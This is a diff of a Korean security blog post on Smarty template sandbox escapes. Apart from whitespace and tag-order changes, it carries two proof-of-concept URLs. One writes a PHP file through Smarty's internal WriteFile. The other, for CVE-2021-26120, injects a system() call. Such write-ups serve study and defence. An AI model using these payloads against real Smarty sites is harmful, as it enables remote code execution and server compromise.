@@ -260,12 +260,8 @@
   <span class="hljs-keyword">object</span>(Smarty_Internal_Extension_Handler)<span class="hljs-meta">#10 (4) { ... }</span>
   [<span class="hljs-meta"><span class="hljs-meta-string">&quot;compiled&quot;</span></span>]=&gt;
   <span class="hljs-keyword">object</span>(Smarty_Template_Compiled)<span class="hljs-meta">#11 (12) { ... }</span></code></pre>
-
 <p>&#xC704;&#xB294; <code>Smarty_Internal_Template</code>&#xAC1D;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; <code>[&quot;smarty&quot;]</code>&#xB610;&#xB294; <code>[&quot;parent&quot;]</code> &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD574; Smarty&#xC758; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xACE0; arbitrary file write&#xB85C; &#xACF5;&#xACA9; &#xBC94;&#xC704;&#xB97C; &#xD655;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs URL">http://localhost:8000/page.php?poc=string:{$s=$smarty.template_object-&gt;smarty}{$fp=$smarty.template_object-&gt;compiled-&gt;filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)}</code></pre>
-
-
-
 <ul>
 <li>CVE-2021-26120</li>
 </ul>
@@ -280,10 +276,8 @@
     }
 }
 </code></pre>
-
 <p>&#xC785;&#xB825; <code>{function name=&apos;test&apos;}{/function}</code>&#xC744; &#xBC1B;&#xC740; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB294; &#xC704;&#xC640; &#xAC19;&#xC740; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. </p>
 <pre><code class="hljs URL">http://localhost:8000/page.php?poc=string:{function+name=&apos;rce(){};system(&quot;id&quot;);function+&apos;}{/function}</code></pre>
-
 
             </div>
             <hr>
@@ -301,9 +295,9 @@
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/cve/">cve</a>
-                  
                   <a class="hover-with-bg" href="/tags/Fabu1ous/">Fabu1ous</a>
+                  
+                  <a class="hover-with-bg" href="/tags/cve/">cve</a>
                   
                   <a class="hover-with-bg" href="/tags/sandbox/">sandbox</a>
                   
